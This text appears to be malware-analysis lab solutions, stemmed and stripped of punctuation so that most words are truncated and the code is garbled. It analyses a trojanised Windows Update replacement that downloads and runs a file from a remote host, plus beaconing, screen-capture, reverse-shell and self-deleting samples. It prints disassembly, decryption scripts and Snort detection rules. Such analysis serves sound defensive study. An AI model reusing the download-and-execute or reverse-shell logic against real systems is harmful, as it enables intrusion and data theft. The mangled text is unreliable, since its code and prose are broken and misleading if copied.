paramet winupex seen creat string cdocument andset usernam localtempwinupex store newfilenam exampl c build string winupex path b add esp h e lea edx ebpvar push edx lpbuffer push eh nbufferlength call ds gettemppatha push offset awinupex winupex lea eax ebpvar b push eax c push offset ass ss push eh count lea ecx ebp newfilenam c push ecx dest call ds snprintf see ida pro renam two local variabl newfilenam existingfilenam local variabl use movefilea call shown exampl c movefilea function move window updat binari user temporari directori exampl c move window updat binari temporari directori lea edx ebp newfilenam c push edx lpnewfilenam lea eax ebp existingfilenam push eax lpexistingfilenam call ds movefilea exampl c see malwar call getmodulehandlea return modul handl current process see seri resourc section api specif findresourcea paramet bin guess result earlier basic analysi malwar extract resourc section disk exampl c resourc extract call ds getmodulehandlea mov ebphmodul eax aa push offset type bin af push offset name b mov eax ebphmodul b push eax hmodul b call ds findresourcea later function follow call findresourcea call loadresourc sizeofresourc createfilea writefil shownher combin function call extract file resourc section bin write file cwindowssystemwupdmgrex malwar creat new window updat binari handler normal circumst attempt creat new handler would fail window file protect would detect chang file overwrit newli creat one malwar disabl function overwrit normal protect window binari last thing function launch new wupdmgrex use winexec function launch ucmdshow paramet swhide shown exampl c order hide program window exampl c launch extract file c push ucmdshow e lea edx ebpfilenam push edx lpcmdline call dswinexec complet analysi binari let examin binari extract resourc section get binari run malwar open newli creat wupdmgrex use resourc hacker carv file load malwar ida pro see familiar subset call main function malwar creat string temporari move origin window updat binari cdocument set usernam localtempwinupex run origin window updat binari use winexec save user temporari directori user perform window updat everyth would appear oper normal origin window updat file would run next ida pro see construct string cwindowssystem wupdmgrdex begin xc store local variabl dest filenam string close origin window updat binari name exampl c notic api call urldownloadtofilea call take interest paramet deserv inspect exampl c analyz extract launch malwar ef push lpbindstatuscallbackf push dword f lea ecx ebpdest f push ecx lpcstr fa push offset ahttpwwwpracti httpwwwpracticalm ff push lpunknown call urldownloadtofilea paramet szurl set httpwwwpracticalmalwareanalysiscomupdaterex szfilenam paramet set dest cwindowssystemwupdmgrdex malwar updat download malwar download updaterex file save wupdmgrdex malwar compar return valu urldownloadtofilea see function call fail return valu malwar execut newli creat file binari return exit analysi malwar lab introduc common way malwar alter window function disabl window file protect malwar lab trojan window updat process creat malwar updat routin user malwar machin would see normal function malwar complet destroy origin window updat binarylab solut short answer two string appear beacon present malwar string command run string output one domain wwwpracticalmalwareanalysiscom get request path may look someth like agzdghbwutzmv xor instruct b lead singlebyt xorencod loop sub singlebyt xor encod use byte xb raw data resourc index xorencod buffer decod wwwpracticalmalwareanalysiscom peid kanal plugin ida entropi plugin identifi use standard base encod string abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz standard base encod use creat get request string base encod function start xb labex copi maximum byte hostnam base encod make get request string maximum charact pad charact may use hostnam length less byte evenli divis labex send regular beacon encod hostnam receiv specif respons quit detail analysi let start run labex monitor behavior listen server set run apatedn inetsim notic malwar beacon wwwpracticalmalwareanalysiscom content similar shown exampl c exampl c labex beacon get agzdghbwutzmv http userag mozilla host wwwpracticalmalwareanalysiscom look string see mozilla string agzdghbwutzmv wwwpracticalmalwareanalysiscom bold exampl c found therefor assum string might encod malwar note agzdghbwutzmv string base hostnam like differ string list also window network librari provid element network beacon get http userag host thu dont expect find element malwar next use static analysi search malwar evid encod techniqu search instanc nonzero xor instruct ida pro find three exampl two xbe xbe identifi librari code search window list function name code ignor leav xor eaxbh instruct xor eaxbh instruct contain sub shown figur c figur c singlebyt xor loop xb sub figur c contain small loop appear increment counter var modifi content buffer arg xore origin content xb argument arg length buffer xore simpl function sub well renam xorencod implement singlebyt xor encod static byte xb take buffer length argument next let identifi content affect xorencod function sub one call xorencod trace code block preced call xorencod see order call getmodulehandlea findresourcea sizeofresourc globalalloc loadresourc lockresourc malwar someth resourc prior call xorencod resourcerel function function point us resourc investig findresourcea exampl c show findresourcea function exampl c call findresourcea push ah lptype push lpname mov eax ebphmodul push eax hmodul call dsfindresourcea mov ebphresinfo eax cmp ebphresinfo jnz short loc ida pro label paramet us lptype xa design resourc data applicationdefin raw data lpname paramet either name index number case index number sinc function refer resourc id look resourc pe file peview find rcdata resourc index x resourc byte long offset x open execut winhex highlight byte choos edit modifi data select xor enter b figur c show result figur c resourc obfusc singlebyt xor encod top portion figur c show origin version data bottom portion show effect appli xor xb byte figur clearli show resourc store string wwwpracticalmalwareanalysiscom encod form two string suspect might encod weve found domain get request string agzdghbwutzmv exampl find get string well use peid kanal plugin identifi base tabl xe exampl c show output kanal plugin exampl c peid kanal output base tabl e e referenc referenc e referenc e referenc navig base tabl see standard base string abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz string four crossrefer ida pro one function start x well refer function baseindex figur c show one code block function figur c base pad see fork refer charact box right side figur c support conclus baseindex relat base encod use pad base encod function call baseindex real baseencod function locat xb purpos divid sourc string byte block pass baseindex encod byte byte one clue make appar use strlen begin function find length sourc string comparison number cmp ebpvar start outer loop code block loc comparison number cmp ebpvar start inner write loop occur baseindex return result conclud baseencod main baseencod function take argument sourc string destin buffer perform base translat use ida pro find one crossrefer baseencod xb function xc refer beacon call baseencod shown exampl c exampl c identifi base encod urlfa lea edx ebphostnam push edx name call gethostnam mov ebpvar eax push count b lea eax ebphostnam push eax sourc lea ecx ebpsrc push ecx dest call strncpi b add esp ch e mov ebpvarc lea edx ebpdst push edx int lea eax ebpsrc push eax str call baseencod f add esp mov byte ptr ebpvar lea ecx ebpdst push ecx mov edx ebparg push edx e push offset ahttpss httpss lea eax ebpszurl push eax dest call sprintf look destin string pass baseencod see push onto stack fourth argument sprintf specif second string format string httpss path uri consist beacon string identifi earlier agzdghbwutzmv next follow sourc string pass baseencod see output strncpi function locat input strncpi function output call gethostnam thu know sourc encod uri path hostnam strncpi function copi first byte hostnam seen note base string repres encod hostnam never longer charact charact expans base still possibl see charact pad end string occur hostnam less charact length hostnam evenli divis look remain code beacon see use wininet internetopena internetopenurla internetreadfil open andread url compos exampl c first charact return data compar letter first charact beacon return otherwis return main function compos singl loop call sleep beacon beacon xc return true get web respons start loop exit program end summar malwar beacon let attack know run malwar send regular beacon encod possibl truncat hostnam identifi receiv specif respons terminateslab solut short answer labex creat larg seemingli random file current directori name start temp end eight hexadecim digit vari file xor search techniqu identifi potenti encodingrel function sub sub three techniqu suggest find noth encod function might found call writefil encod function subf sourc content screen captur algorithm nonstandard easili determin easiest way decod traffic via instrument see detail analysi recov origin sourc encod file detail analysi launch malwar see creat new file regular interv current directori file fairli larg multipl megabyt contain seemingli random data filenam start temp end randomlook charact someth like one shown exampl c exampl c exampl filenam creat labex tempda tempdcb tempdf tempef tempef next search malwar evid encod techniqu use static analysi peid kanal plugin findcrypt plugin ida pro ida entropi plugin fail find anyth interest howev search xor instruct yield result shown tabl c tabl c xor instruct found labex address function instruct sub xor eax eax subd xor eax ebpvar f xor eax esiedx f sub xor edx ecx sub xor edx ecx sub xor edx ecx sub xor eax edx sub xor eax edx ac sub xor eax edx bd sub xor ecx eaxh c sub xor ecx eax sub xor ecx eax e sub xor edx ecxh f sub xor edx ecx fc sub xor edx ecx e main xor eax eax xor dh eax e xor eax dh xor ecx ecx xor edx edx instruct label tabl c repres clear regist ignor instruct label contain librari function also ignor left two function interest subd andsub addit xf area code defin function well refer sub heavyxor sinc mani xor instruct subd singlexor sinc one heavyxor take four argument singl loop larg block code contain mani shl shr instruct addit xor instruct look function call heavyxor see singlexor relat heavyxor sinc caller singlexor also call heavyxor shown figur c figur c relationship encrypt function look xor instruct tabl c xf see function function automat identifi due lack use defin function x result creation function encompass previous orphan xor instruct seen figur c unus function also relat cluster like encod function confirm heavyxor encod function let see relat temp file written disk find data written disk trace backward determin encod function use look import function see writefil check crossrefer writefil find sub take argument buffer length filenam open file write buffer file well renam sub writebuffertofil sub function call writebuffertofil exampl c show content sub renam dostuffandwritefil lead call writebuffertofil exampl c write encrypt file lea eax ebpnnumberofbytestowrit push eax lea ecx ebplpbuff push ecx call sub renam getcont add esp mov edx ebpnnumberofbytestowrit push edx mov eax ebplpbuff push eax call subf renam encodingwrapp add esp call dsgettickcount mov ebpvar eax mov ecx ebpvar push ecx push offset format tempx lea edx ebpfilenam push edx dest call sprintf add esp ch lea eax ebpfilenam push eax lpfilenam mov ecx ebpnnumberofbytestowrit push ecx nnumberofbytestowrit mov edx ebplpbuff push edx lpbuffer call writebuffertofil work start exampl c see two function call sub subf use buffer length argument format string tempx combin result gettickcount reveal sourc filenam current time print hexadecim ida pro label filenam indic code exampl c good hypothesi sub use fetch content let call getcont subf use encrypt content well renam encodingwrapp look first hypothes encod function encodingwrapp xf see mere wrapper heavyxor confirm function depict figur c encod function function encodingwrapp set four argument encod local variabl clear use two pointer point buffer pass dostuffandwritefil buffer size also pass dostuffandwritefil two pointer point buffer suggest encod function take sourc destin buffer along length andthat case encod perform place next identifi sourc content encod written disk mention earlier function getcont x appear acquir content look getcont see singl block code numer system function shown exampl c exampl c window api function call getcont sub getsystemmetr getdesktopwindow getdc createcompatibledc createcompatiblebitmap selectobject bitblt getobjecta globalalloc globallock getdibit memcpi globalunlock globalfre releasedc deletedc deleteobject base list good guess function tri captur screen notabl getdesktopwindow bold get handl desktop window cover entir screen function bitblt getdibit also bold relat retriev bitmap inform copi buffer conclud malwar repeatedli take snapshot user desktop write encrypt version screen captur file order verifi conclus take one captur file run back encrypt algorithm retriev origin captur imag assum algorithm stream cipher encrypt revers encrypt decrypt thing sinc clue algorithm use easiest way implement use instrument let code perform decod us sinc code alreadi instruct take buffer encrypt write file well reus follow let program run normal encryptionreplac buffer hold screen captur buffer hold previous save file wish decrypt let program write output temporari filenam base current time break program first file written implement strategi manual use ollydbg use scriptbas approach provid flexibl well look manual approach first decod use ollydbg implement instrument strategi use ollydbg identifi two key breakpoint first encod use x breakpoint call encodingwrapp occur exampl c second breakpoint first file written set xa start malwar ollydbg set breakpoint run program malwar stop first breakpoint x point argument stack repres buffer encrypt length rightclick top valu stack stack pane valu locat esp select follow dump next open one encrypt file malwar creat winhex select edit copi hex valu ollydbg select valu top dump pane end memori block ollydbg requir entir target area select allow past content select repres buffer encod fill content file dont worri memori block longer buffer size ollydbg past content length file rightclick hex dump portion dump pane select binari binari past your use editor allow copi binari valu directli past ascii portion dump pane instead buffer prepar run ollydbg final breakpoint check malwar directori new file name convent previous creat one give file bmp extens open see screenshot taken malwar runningnot ensur file size second argument pass encrypt function didnt chang screen resolut initi malwar run decrypt run size file size larger memori buffer techniqu may fail script solut order implement instrument strategi gener way depend avail buffer size use pythonbas debugg api immun debugg immdbg discuss scriptabl debug well chapter creat python script shown exampl c save file py extens pyscript folder immdbg instal directori note custom exampl filenam ctempda open assign cfile exampl c base environ exampl c immdbg decrypt script usrbinenv python import immlib def main imm immlibdebugg immsetbreakpointx break push arg encod immrun execut breakpoint crypto cfile openctempdarb buffer cfileread read encrypt file buffer sz len buffer membuf immremotevirtualallocsz alloc memori within debugg process immwritememorymembufbuff reg immgetreg immwritelongregsebp membuf set stack variabl immwritelongregsebp sz immsetbreakpointxa singl loop immrun see exampl c first breakpoint stop execut argument push stack open call open encrypt file alreadi written filesystem next line read file memori calcul size buffer remotevirtualalloc call isus creat appropri size buffer memori run process writememori use copi file content new buffer two writelong call replac stack variabl buffer encrypt size next instruct push variabl onto stack use follow encrypt routin write file open malwar immdbg choos immlib run python script select script creat script run debugg halt second breakpoint point malwar written singl file directori navig malwar directori identifi recent written file chang extens file bmp open see decrypt screenshot taken earlier malwarelab solut short answer dynam analysi might reveal randomlook content may encod recogniz string program output noth els suggest encod search xor instruct reveal six separ function may associ encod type encod immedi clear three techniqu identifi advanc encrypt standard ae algorithm rijndael algorithm associ six xor function identifi ida entropi plugin also identifi custom base index string show evid associ xor instruct malwar use ae custom base cipher key ae ijklmnopqrstuvwx key custom base cipher index string cdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzab index string suffici custom base implement ae variabl key may need implement decrypt includ keygener algorithm one use key size mode oper initi vector one need malwar establish revers command shell incom command decod use custom base cipher outgo commandshel respons encrypt ae see detail analysi exampl decrypt content detail analysi start basic dynam analysi see malwar tri resolv domain name wwwpracticalmalwareanalysiscom connect tcp port host use netcat send content connect see malwar respond random content recognizablestr termin socket netcat side see messag like error api readconsol error code messag oper complet success examin output string see evid relat string seen far wwwpracticalmalwareanalysiscom error api error code messag readconsol relev string like writeconsol duplicatehandl may part error messag like preced readconsol error random content seen dynam analysi suggest encod use although cant tell encod certain string suggest malwar perform encrypt includ data multipl block size empti key incorrect key length incorrect block length examin xor instruct elimin associ regist clear librari function find six contain xor given larg number identifi function let label see correspond addit techniqu appli tabl c summar renam ida pro function name tabl c function contain suspect xor instruct assign function name address function sxor ac sxor sxor ed sxor da sxor sxor use findcrypt plugin ida pro find constant shown exampl c exampl c findcrypt output cb found const array rijndaelt use rijndael cf found const array rijndaelt use rijndael found const array rijndaelt use rijndael found const array rijndaelt use rijndael db found const array rijndaeltd use rijndael df found const array rijndaeltd use rijndael e found const array rijndaeltd use rijndael e found const array rijndaeltd use rijndael found known constant array total exampl c refer rijndael origin name ae cipher look crossrefer clear sxor sxor connect encrypt constant tex sxor sxor connect decrypt constant tdx peid kanal plugin reveal ae constant similar locat exampl c show output peid tool peid identif sinv refer sbox structur basic compon cryptograph algorithm exampl c peid kanal output rijndael char c c rijndael sinv char ca ca final ida entropi plugin show area high entropi first examin region high bit entropi bit chunk size minimum entropi valu highlight area xc xcbthe area previous identifi sbox region look region high bit entropi bit chunk size minimum entropi valu also find area within data section xa xa shown figur c figur c ida entropi plugin high bit entropi find look high entropi area shown figur c see string start xa contain base characterscdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzab notic standard base string capit ab lowercas ab move back uppercas lowercas section malwar may use custom baseencod algorithm let review relationship xorrel function identifi inform collect locat rijndael constant weve identifi clear sxor sxor function relat ae encrypt sxor sxor function relat ae decrypt code insid sxor function shown figur c figur c xor encod loop sxorth loop figur c contain xor instruct show sxor use xor encod variabl arg pointer sourc buffer transform arg point buffer provid xor materi loop follow pointer two buffer arg arg well counter var updat shown three refer determin sxor relat encod function examin crossrefer function call sxor start xd figur c show graph function crossrefer xd figur c relationship encrypt function graph see sxor inde relat ae encrypt function sxor sxor although evid sxor sxor relat ae decrypt relationship two function function less clear exampl look crossrefer sxor see two locat sxor call xee xd appear contain valid code area defin function suggest ae code link malwar decrypt use thu decrypt routin show initi dead code identifi function sxor call x decrypt function recreat graph show function call x renam saesdecrypt xd whichw renam saesencrypt shown figur c figur c relationship xor function ae graph show clearli relationship among ae function see xor function sxor relat ae implement look sxor see sever earli branch code occur argument incorrect luckili malwar still error messag present error messag includ empti key incorrect key length incorrect block length impli key initi code confirm weve identifi key initi code tri find connect function previous identifi ae function look call function sxor see sxor call refer unkef offset pass sxor function use ecx look refer unkef find x one place offset unkef load ecx call saesencrypt address unkef must c object repres ae encryptor sxor initi function encryptor look back sxor see empti key messag issu test arg paramet assum arg paramet key look paramet setup main near call sxor x associ arg string ijklmnopqrstuvwx push stack string key use ae malwareher review know ae use malwar saesencrypt use function xb encrypt occur call readfil call writefil sxor ae initi function occur start process sxor set ae password ijklmnopqrstuvwx addit ae identifi possibl use custom base cipher use ida entropi plugin indic figur c examin refer string cdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzab learn string function xf function index lookup string call function x divid string decod byte chunk function x custom base decod function see function call xc decod function lie readfil writefil pattern saw use ae differ function decrypt content need determin connect content encod algorithm know ae encrypt function use function start xb look function call function xb exampl c see xb start new thread creat createthread shown renam xb aesthread exampl c paramet createthread aesthread mov eax ebpvar mov ebpvar eax mov ecx ebparg c mov ebpvar ecx f mov edx dwordc mov ebpvar edx lea eax ebpvarc b push eax lpthreadid c push dwcreationflag e lea ecx ebpvar push ecx lpparamet push offset aesthread lpstartaddress push dwstacksiz push lpthreadattributesb call dscreatethread paramet thread start function pass locat var see three variabl push onto stack rel var follow var move var arg move var dwordc move var aesthread xb see paramet use exampl c show select portion aesthread call readfil writefil origin handl pass function exampl c handl pass readfil writefil aesthread mov eax ebparg mov ebpvarb eax mov ecx ebpvarb mov edx ecx aa push edx hfile ab call dsreadfil mov eax ebpvarb mov ecx eax push ecx hfile call dswritefil valu push readfil map back var var shown exampl c valu push writefil exampl c map back var arg shown exampl c trace handl valu back origin find first var var hold handl pipe creat earli function xb pipe connect output command shell command hsourcehandl copi standard output standard error command shell start createprocess command xb shown exampl c exampl c connect pipe shell output mov ecx ebphsourcehandl b mov ebpstartupinfohstdoutput ecx e mov edx ebphsourcehandl mov ebpstartupinfohstderror edx handl use writefil aesthread var arg betrac paramet pass main function xa network socket creat connect call aesthread xb function read output launch command shell encrypt write network socket custom baseencod function x also use function xc start via thread trace input similar trace input ae thread mirror imag conclus base thread read input remot socket decod function send result input command shell modifi base decod establish two type encod malwar let tri decrypt content begin custom base encod well assum part captur network commun come remot site string binaei exampl c show custom script decrypt modifi base implement exampl c custom base decrypt script import string import base tab cdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzab b abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz ciphertext binaei ch ciphertext ch tab bstringfindtabstrch elif ch print basedecodestr note code exampl c gener script repurpos custom base implement redefin tab variabl use script translat string see command sent command shell output exampl c show attack send arequest directori list dir exampl c output custom base decrypt script python custombdecryptpi dir decrypt ae translat ae side command channel slightli challeng exampl say malwar send raw stream content shown exampl c exampl c aesencrypt network content f f e b ac b f q e f af c f cb c ov mqq cf c c c c ab df fx f f f b c c bf f c jswmo ec b b fa c b bb ca e bb dd b b f e c g f ee b df de e ef db bd nj b ee f cb f v vx af af f f f c c f dc goi pycrypto librari provid conveni cryptograph routin deal data like use code shown exampl c decrypt content exampl c ae decrypt script cryptociph import ae import binascii raw f f e b ac b f f af c f cb c cf c c c c ab df f f f b c c bf f c ec b b fa c b bb ca e bb dd b b f e c ee b df de e ef db bd b ee f cb f af af f f f c c f ciphertext binasciiunhexlifyrawreplac obj aesnewijklmnopqrstuvwx aesmodecbc print plaintext objdecryptciphertext raw variabl defin contain raw network content identifi exampl c rawreplac function remov space raw string binasciiunhexlifi function turn hex represent binari string aesnew call creat new ae object appropriatepassword mode oper allow follow decrypt call output ae script shown exampl c note captur content simpli command prompt exampl c ae decrypt script output python aesdecryptpi plaintext microsoft window xp version c copyright microsoft corp cdocument settingsuserdesktopdemo crypto pitfal default use pycrypto librari routin work success lab solut mani potenti pitfal tri implement decrypt routin directli includ follow block cryptographi algorithm mani possibl mode oper electron code book ecb cipher block chain cbc cipher feedback cfb mode requir differ set step encod decod block requir initi vector addit password dont match implement use decrypt may work partial lab key provid directli given implement may techniqu gener key given userprovid stringbas password case keygener algorithm need identifi duplic separ within standard algorithm may option must specifi correctli exampl singl encrypt algorithm may allow multipl key size block size round encrypt decrypt pad strategieslab solut short answer program contain urldownloadtocachefil function use com interfac malwar use com interfac content http request come within window therefor effect target use network signatur sourc element part host guid usernam guid uniqu individu host os byte portion use beacon rel uniqu usernam chang depend log system attack may want track specif host run download target specif user base encod standard sinc use instead equal sign pad malwar download execut code element malwar commun target includ domain name colon dash found base decod fact last charact base portion uri singl charact use filenam png file defend may tri target element uri dont realiz os determin case base string end usual make filenam appear apng howev usernam length even multipl three final charact filenam depend last charact encod usernam case filenam unpredict see detail analysi recommend signatur detail analysi packet captur associ malwar well use dynam analysi help us understand function run malwar see abeacon like one shown exampl c exampl c beacon request initi malwar run get ndenzmnumjkotmntytsmobibtbwlaaaa apng http accept uacpu x acceptencod gzip deflat userag mozilla compat msie window nt net clr net clr net clr netc nete host wwwpracticalmalwareanalysiscom connect keepal note troubl see beacon make sure dn request redirect intern host program netcat inetsim accept inbound connect port examin singl beacon alon difficult tell compon might hardcod tri run malwar multipl time would find use beacon time anoth host avail tri run malwar may get someth like result shown exampl c exampl c beacon request second malwar run use differ host get otymdaqtindyotgotitdxnlcgaa apng http accept acceptencod gzip deflat userag mozilla compat msie window nt sv net clr net clr net clr net clr host wwwpracticalmalwareanalysiscom connect keepal second exampl clear userag either hard code malwar choos multipl userag string fact quick test use internet explor second host find regular browser activ match userag seen beacon indic malwar like use com api compar uri see aaapng appear consist string move static analysi load malwar ida pro identifi network function look import clear function use beacon urldownloadtocachefilea use com api agre dynam test show differ host gener differ userag string also match internet explor userag stringssinc urldownloadtocachefilea appear network function use continu analysi function contain xa one quick observ function contain call urldownloadtocachefilea createprocessa well renam function downloadnrun ida pro within downloadnrun notic prior urldownloadtocachefilea function follow string referenc httpwwwpracticalmalwareanalysiscomscpng string use input call sprintf whose output use paramet urldownloadtocachefilea see format string filenam png file alway singl charact defin c middl segment uri defin determin beacon gener trace backward find origin input c paramet annot output shown comment exampl c exampl c annot code sprintf argument ac mov eax ebpstr str pass argument af push eax str b call strlen b add esp b mov ebpvar eax var contain size string mov ecx ebpstr c add ecx ebpvar ecx point end string c mov dl ecx dl get last charact string ca mov ebpvar dl var contain last charact string movsx eax ebpvar eax contain last charact string push eax c argument contain last charact string mov ecx ebpstr db push ecx argument contain string str code exampl c prepar argument c pass sprintf function line xd push c argument onto stack line xdb push argument onto stack earlier code xacxca repres copi last charact c first strlen use calcul end string xacxb last charact copi local variabl var use c xbexca thu final uri filenam c alway last charact string explain filenam exampl sinc match last characterto figur string input navig call function actual main figur c show overview main includ sleep loop refer downloadnrun function figur c sleep loop downloadnrun function function loop label subbb appear modifi string pass downloadnrun xa function downloadnrun function take two argument input output string examin subbb see contain two subroutin one strlen subroutin x contain refer standard base string abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz sub howev standard base encod function base function typic static refer equal sign case need provid pad end byte charact block mani implement two refer sinc last two charact byte block pad figur c show one fork base encod functionx may choos either encod charact pad charact path right figur show assign pad charact rather typic figur c base encod function x altern pad within main function immedi prior primari outer base encod function see function getcurrenthwprofilea getusernam sprintf string cccccccccccc ss six byte guid return getcurrenthwprofilea print mac address format hexadecim form colon byte becom first string ss second string usernam thu underli string format shown hh repres hexadecim byte hh hh hh hh hh hh usernam verifi correct format base decod string ndenzmnumjkotmntytsmobibtbwlaaaa saw initi dynam analysi run shown exampl c result ejohn smithxxa rememb earlier malwar use standard base encod except pad charact use extra charact result john smith come use standard base decod interpret aa end string regular charact instead identifi replac pad charact identifi sourc beacon let see happen content receiv return urldownloadtocachefilea function xa label downloadnrun see success fork function command createprocessa take paramet thepathnam return urldownloadtocachefilea malwar download file simpli execut file quit network signatur key static element target analyz network signatur colon dash provid pad among hardwar profil byte usernam howev target element challeng malwar appli layer base encod send content onto network tabl c show charact translat well pattern target tabl c static pattern within base encod origin e joh n mit h encod nde nzm nu mjk otm nti smo bibt bwl aaaa colon origin string third charact tripl encod use base bit fourth charact quad come third charact everi fourth charact colon use dash sixth quad alway end thu know uri alway least charact long specif locat four charact also know charact set may use repres rest uri download name singl charact end path two regular express consid first regular express azaz azaz azaz zaz azaz azaz azaz one main element express azaz shown bold match singl base charact better understand express well use greek omega replac element next expand multipl charact ta see represent show clearli express captur block four charact end regular express target first segment uri static charact second regular express target base express least charact filenam singl charact follow png last charact previou segment follow regular express azazazazpng appli clarifi shortcut use previou express give us png express refer first element captur parenthes last base charact string forward slash two regular express identifi pattern produc malwar translat snort signatur detect malwar produc traffic network first signatur could follow alert tcp homenet externalnet httpport msgpm colon dash urilen contentget depth pcre getx azaz azazazazazazazaza zaztazaz sid rev snort rule includ content string get start packet usual better uniqu content string improv packet process urilen keyword ensur uri specif length case greater charact account addit charact beyond first path segment second signatur snort rule signatur could follow alert tcp homenet externalnet httpport msgpm base png urilen uricontentpng pcre azazazaz png sid rev snort rule search png content regular express test pcre regular express order improv packetprocess perform also add check uri length known minimum addit preced signatur could also target area like domainnam wwwpracticalmalwareanalysiscom fact malwar download execut combin signatur often effect strategi exampl malwar signatur produc regular fals posit may still effect combin signatur trigger execut downloadlab solut short answer attack may find static ip address difficult manag domain name use dn allow attack deploy asset comput dynam redirect bot chang dn address defend variou option deploy defens type infrastructur similar reason ip address difficult deal domain name fact alon could lead attack choos static ip address domain malwar use wininet librari one disadvantag librari hardcod userag need provid option header need hardcod desir one advantag wininet librari winsock api exampl element cooki cach header provid os string resourc section pe file contain url use command control attack use resourc section deploy multipl backdoor multipl commandandcontrol locat without need recompil malwar attack abus http userag field contain applic inform malwar creat one thread encod outgo inform field anoth use static field indic receiv side channel initi beacon encod commandshel prompt attack encod outgo inform doesnt encod incom command also server must distinguish two commun channel via static element userag field server depend appar target signatur encod scheme base custom alphabet commun termin use keyword exit exit malwar tri delet malwar small simpl backdoor sole purpos provid commandshel interfac remot attack wont detect common network signatur watch outbound commandshel activ particular malwar like throwaway compon attack toolkit support fact tool tri delet detail analysi begin perform dynam analysi malwar malwar initi send beacon odd userag string get tenfourhtml http userag eljcxnbqdadnbtdrhgawgplcinbqsgisvgjdqhzxdzommomkgoqx uenqhdzltjzrhjwuhxiaimbritogoqxmcysiygfonncbxjdplbndbasyxea tcpvpcqmllcqrbrwi host cachecontrol nocach short time later send second beacon get tenfourhtml http userag internet surf host cachecontrol nocach note see initi beacon second one problem may due way simul server particular malwar use two thread send http request server one thread fail get respons entir process exit reli netcat simpl solut simul server might get initi beacon second beacon fail first quit order dynam analyz malwar must use two instanc netcat robust fake server infrastructur inetsim multipl trial dont produc chang beacon content modifi host user chang initi encod beacon give us clue sourc inform encod beacon depend hostspecif inform begin network function see import internetopena internetopenurla internetreadfil internetclosehandl wininet librari one argument internetopenurla constant x look valu paramet affect see repres internetflagreload flag set flag produc cachecontrol nocach line initi beacon demonstr theadvantag use higherlevel protocol instead basic socket call malwar use basic socket call would need explicitli includ cach control nocach string code therebi open easili identifi malwar make mistak attempt imit legitim traffic two beacon relat answer question creat cross refer graph function ultim use internet function shown figur c see malwar two distinct symmetr part examin first call createthread winmain clear function xc label startaddress start address new thread function xco label sthreadstart also start address new thread examin startaddress xc see addit sinternet x function also call malloc peeknamedpip readfil exitthread sleep anoth intern function function sthreadstart xco contain similar structur call sinternet x malloc writefil exitthread sleep function peeknamedpip use watch new input name pipe stdin stdout associ command shell name pipe determin read written two thread turn attent winmain sourc thread shown figur c see winmain start two thread call function createpipea getcurrentprocess duplicatehandl createprocessa function createprocessa creat new cmdex process function set new process stdin stdout associ command process handl availablefigur c function graph function connect internet function malwar author follow common pattern build revers command shell attack start new command shell process start independ thread read input write output command shell startaddress xc thread check new input command shell use peeknamedpip content exist use readfil read data data read send content remot locat use sinternet x function sthreadstart xc connect remot locat use sinternet x new input command shell write command shell input pipe let return paramet pass internet function sinternet x look origin sourc make paramet function internetopenurla take url paramet later see pass function argument copi buffer earli function preced function label startaddress xc see url also argument fact trace sourc url must go way back start winmain xc call loadstringa examin resourc section pe file see url use beacon fact url use similarli beacon sent threadswev identifi one argument sinternet x url argument userag string navig sinternet x see static string start function match start userag string seen beacon concaten longer string pass one argument sinternet x sinternet x call intern function xb take two input paramet output primari content userag string encod function custom base variant use base string wxyzlabcdfghijkoeabcdefghijklmnopqrstuvmnpqrstuvwxyz initi beacon string decod result follow microsoft window xp version c copyright microsoft corp cdocument settingsuserdesktop thread use internet function sinternet x alreadi mention sinternet use url paramet sinternet userag string function static defin string internet surf sthreadstart xc thread mention earlier use pass input command shell also provid facil termin program base input oper pass string exit malwar malwar exit code block locb locat sthreadstart xc contain refer exit string strnicmp function use test incom network content note could also use dynam analysi gain insight malwar encod function xb could identifi base string contain set breakpoint function debugg would seen window command prompt argument prior encod encod command prompt vari bit base specif os usernam found beacon chang base host user summari two thread handl differ end pipe command shell thread static userag string get input fromth remot attack thread encod userag string serv output command shell clever way attack obfusc activ avoid send command prompt compromis server clear one piec evid support idea throwaway compon attack fact malwar tri delet exit winmain xc three possibl function end two earli termin occur thread fail success creat three termin case call x purpos x delet malwar disk malwar exit x implement comspec method selfdelet essenti comspec method entail run shellexecut command comspec environment variabl defin command line c del executabletodelet nul precis x network signatur signatur url target static userag field static charact encod userag length charact restrict encod commandshel prompt shown exampl c exampl c snort signatur lab solut alert tcp homenet externalnet httpport msgpm suspici userag internet surf content useragentinternetsurf httpheader sid rev alert tcp homenet externalnet httpport msgpm suspici userag start content userag httpheader sid rev alert tcp homenet externalnet httpport msgpm suspici userag long b contentuserag content distanc within pcreuseragentxxdazaz sid rev exampl c first two signatur straightforward target userag header content hope uncommon last signatur target length charact restrict encod commandshel prompt without assum exist lead charact target signatur look less specif pattern like encount fals posit thepcr regular express search userag header follow string least charact base charact set allow five charact valu start userag long line feed indic new header option five charact allow special start userag string seen malwar requir charact base charact set loos base expect length command prompt final neg content search space charact pure increas perform signatur userag string space charact fairli earli string check avoid need test regular express userag stringslab solut short answer hardcod header includ accept acceptlanguag uacpu acceptencod userag malwar author mistakenli add addit userag actual userag result duplic string userag userag mozilla complet user agent header includ duplic make effect signatur domain name path url hardcod configur file unavail signatur made hard code url well configur file observ howev would probabl fruit target hardcod compon link dynam url url use store configur file chang one command know ephemer malwar obtain command specif compon web page insid noscript tag similar comment field exampl mention chapter use techniqu malwar beacon legitim web page receiv legitim content make analysi malici versu legitim traffic difficult defend order content interpret command must includ initi noscript tag follow full url includ http contain domain name use origin web page request path url must end domain name truncat two section compos command argument form similar command first letter command must correspond allow command applic argument must translat meaning argument given command malwar author limit string avail provid clue malwar function search noscript malwar search verifi noscript tag independ scrambl charact comparison malwar also reus buffer use thedomain check command content string search three charact search charact evalu command first charact consid attack may exampl give malwar command sleep either word soft seller web respons traffic analysi might identifi attack use word soft send command malwar might lead misguid use complet word signatur attack free use seller word start without modif malwar encod sleep command number repres number second sleep two command argument encod custom albeit simpl encod base argument present even number digit trail remov set two digit repres raw number index array abcdefghijklmnopqrstuvwxyz argument use commun url need capit charact advantag scheme nonstandard need reverseengin order understand content disadvantag simpl may identifi 